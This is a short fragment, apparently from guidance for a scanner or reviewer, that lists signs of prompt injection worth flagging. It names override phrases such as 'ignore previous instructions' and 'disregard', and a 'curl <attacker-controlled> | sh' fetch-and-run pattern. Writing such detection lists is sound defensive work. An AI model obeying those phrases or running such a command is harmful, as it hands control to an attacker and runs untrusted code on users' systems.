...
**Real catches worth acting on:** verbatim "ignore previous instructions" / "ignore all
instructions" / "disregard" strings; `curl <attacker-controlled> | sh`; base64-encoded
